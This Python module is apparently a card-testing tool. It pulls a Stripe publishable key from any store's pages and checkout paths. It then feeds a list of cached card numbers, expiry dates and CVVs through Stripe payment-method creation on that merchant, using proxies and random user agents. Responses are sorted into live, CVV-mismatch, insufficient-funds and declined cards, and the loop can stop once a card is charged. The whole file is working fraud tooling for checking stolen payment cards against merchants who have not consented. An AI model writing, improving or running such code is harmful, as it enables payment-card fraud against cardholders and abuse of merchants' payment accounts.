"""
Auto Checkout Module - Try cached cards against Stripe stores
Automatically extracts Stripe PK from any store URL and attempts checkout
"""

import asyncio
import httpx
import re
import random
from typing import Optional, Callable
from urllib.parse import urlparse

from gates.stripe_live_flow import StripeFlow, StripeStatus

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/137.0.6367.207 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/137.0.6367.207 Safari/537.36",
]


async def extract_stripe_pk(url: str, proxy: str = None) -> Optional[str]:
    """
    Extract Stripe Publishable Key from a website
    Returns the pk_live_* or pk_test_* key if found
    """
    if not url.startswith("http"):
        url = f"https://{url}"
    
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    proxy_config = {"http://": proxy, "https://": proxy} if proxy else None
    
    try:
        async with httpx.AsyncClient(timeout=15, follow_redirects=True, proxies=proxy_config) as client:
            resp = await client.get(url, headers=headers)
            html = resp.text
            
            pk_patterns = [
                r'pk_live_[a-zA-Z0-9]{20,100}',
                r'pk_test_[a-zA-Z0-9]{20,100}',
                r'"publishableKey":\s*"(pk_[a-zA-Z0-9_]+)"',
                r"'publishableKey':\s*'(pk_[a-zA-Z0-9_]+)'",
                r'data-key="(pk_[a-zA-Z0-9_]+)"',
                r'Stripe\([\'"]?(pk_[a-zA-Z0-9_]+)[\'"]?\)',
            ]
            
            for pattern in pk_patterns:
                matches = re.findall(pattern, html)
                if matches:
                    pk = matches[0] if isinstance(matches[0], str) else matches[0]
                    if pk.startswith("pk_"):
                        return pk
            
            checkout_paths = ["/checkout", "/cart", "/payment", "/donate", "/pay"]
            for path in checkout_paths:
                try:
                    resp2 = await client.get(url.rstrip("/") + path, headers=headers)
                    for pattern in pk_patterns[:2]:
                        matches = re.findall(pattern, resp2.text)
                        if matches:
                            return matches[0]
                except:
                    continue
            
            return None
    except Exception as e:
        print(f"[AutoCheckout] Error extracting PK from {url}: {e}")
        return None


def try_card_sync(stripe_pk: str, card_num: str, card_mon: str, card_yer: str, 
                  card_cvv: str, proxy: dict = None) -> dict:
    """
    Synchronous card check using StripeFlow
    Returns dict with status, message, charged boolean
    
    create_payment_method returns (pm_id, error):
    - If pm_id exists: Card is CCN LIVE (valid card number)
    - If pm_id is None: Card declined, error contains reason
    """
    try:
        flow = StripeFlow(stripe_pk, proxy=proxy)
        
        pm_id, error_msg = flow.create_payment_method(card_num, card_mon, card_yer, card_cvv)
        
        if pm_id:
            return {
                "status": "CCN_LIVE",
                "message": f"Payment Method Created: {pm_id[:20]}...",
                "approved": True,
                "charged": False,
                "requires_3ds": False,
                "pm_id": pm_id,
            }
        else:
            error_lower = error_msg.lower() if error_msg else ""
            
            if "cvv" in error_lower or "cvc" in error_lower or "security code" in error_lower:
                return {
                    "status": "CVV_MISMATCH",
                    "message": error_msg,
                    "approved": True,
                    "charged": False,
                    "requires_3ds": False,
                }
            elif "insufficient" in error_lower:
                return {
                    "status": "INSUFFICIENT_FUNDS",
                    "message": error_msg,
                    "approved": True,
                    "charged": False,
                    "requires_3ds": False,
                }
            elif "3d" in error_lower or "authentication" in error_lower:
                return {
                    "status": "3DS_REQUIRED",
                    "message": error_msg,
                    "approved": True,
                    "charged": False,
                    "requires_3ds": True,
                }
            else:
                return {
                    "status": "DECLINED",
                    "message": error_msg or "Card declined",
                    "approved": False,
                    "charged": False,
                    "requires_3ds": False,
                }
    except Exception as e:
        return {
            "status": "ERROR",
            "message": str(e),
            "approved": False,
            "charged": False,
            "requires_3ds": False,
        }


async def auto_checkout_all_cards(
    store_url: str,
    cards: list,
    proxy: str = None,
    progress_callback: Callable = None,
    stop_on_success: bool = True,
) -> dict:
    """
    Try all cached cards against a Stripe store
    
    Args:
        store_url: URL of the Stripe-enabled store
        cards: List of card dicts from get_all_cached_cards()
        proxy: Optional proxy URL
        progress_callback: Async callback(current, total, result) for progress updates
        stop_on_success: Stop after first successful charge (default True)
    
    Returns:
        dict with results summary
    """
    stripe_pk = await extract_stripe_pk(store_url, proxy)
    
    if not stripe_pk:
        return {
            "success": False,
            "error": "Could not find Stripe key on this site",
            "store_url": store_url,
            "cards_tried": 0,
            "results": [],
        }
    
    proxy_dict = None
    if proxy:
        proxy_dict = {"http": proxy, "https": proxy}
    
    results = []
    approved_cards = []
    charged_cards = []
    
    for i, card_data in enumerate(cards):
        card_str = card_data["card"]
        parts = card_str.split("|")
        if len(parts) < 4:
            continue
        
        card_num, card_mon, card_yer, card_cvv = parts[0], parts[1], parts[2], parts[3]
        
        result = await asyncio.to_thread(
            try_card_sync, stripe_pk, card_num, card_mon, card_yer, card_cvv, proxy_dict
        )
        
        result["card_id"] = card_data["id"]
        result["card_masked"] = card_data["card_masked"]
        results.append(result)
        
        if result["approved"]:
            approved_cards.append(card_data)
            if result["charged"]:
                charged_cards.append(card_data)
        
        if progress_callback:
            await progress_callback(i + 1, len(cards), result)
        
        if stop_on_success and result["charged"]:
            break
        
        await asyncio.sleep(0.5)
    
    return {
        "success": len(charged_cards) > 0,
        "store_url": store_url,
        "stripe_pk": stripe_pk[:20] + "...",
        "cards_tried": len(results),
        "approved": len(approved_cards),
        "charged": len(charged_cards),
        "results": results,
        "charged_cards": charged_cards,
        "approved_cards": approved_cards,
    }
